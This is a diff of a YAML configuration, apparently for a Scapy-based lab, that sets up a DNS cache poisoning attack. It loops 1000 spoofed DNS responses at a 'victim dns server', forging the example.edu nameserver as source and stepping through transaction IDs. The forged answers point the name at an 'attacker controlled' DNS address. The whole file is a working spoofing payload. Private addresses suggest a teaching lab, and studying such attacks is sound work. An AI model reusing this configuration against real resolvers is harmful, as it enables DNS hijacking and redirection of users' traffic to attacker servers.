@@ -1,27 +1,15 @@
-send: # https://scapy.readthedocs.io/en/latest/api/scapy.sendrecv.html?highlight=sniff#scapy.sendrecv.send
+loop:
+    count: 1000
+    method: "send"
     packets: # Scapy calls this 'x'
         - IP: # https://scapy.readthedocs.io/en/latest/api/scapy.layers.inet.html?highlight=IP#scapy.layers.inet.IP.fields_desc
-          dst: "172.22.0.4" # Apollo / victim dns server
-          UDP: # https://scapy.readthedocs.io/en/latest/api/scapy.layers.inet.html?highlight=IP#scapy.layers.inet.UDP
-            sport: 33333 # Source port 33333
-            dport: 53 # 53 is port for dns
-            DNS: # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNS
-              id: 0 # This is ransomized in a real query
-              qdcount: 1
-              qd:
-                qname: "xxxxx.example.edu" # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNSQR
-                qtype: "A" # A
-                qclass: "IN" # IN
-        loop:
-          count: 1000
-          - IP: # https://scapy.readthedocs.io/en/latest/api/scapy.layers.inet.html?highlight=IP#scapy.layers.inet.IP.fields_desc
             dst: "172.22.0.4" # Apollo / victim dns server
             src: "199.43.133.53" # example.edu nameserver
             UDP: # https://scapy.readthedocs.io/en/latest/api/scapy.layers.inet.html?highlight=IP#scapy.layers.inet.UDP
               sport: 53 # DNS port
               dport: 33333 # 33333 is hardcoded setup port
               DNS: # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNS
-                id: "0" # Iterative?
+                id: i # i is the count
                 qr: 1 # Response
                 qdcount: 1
                 ancount: 1
@@ -48,3 +36,4 @@ send: # https://scapy.readthedocs.io/en/latest/api/scapy.sendrecv.html?highlight
                   rclass: "IN"
                   ttl: 86400
                   rdata: "172.22.0.5" # Attacker controlled dns
+    iface: "eth0"
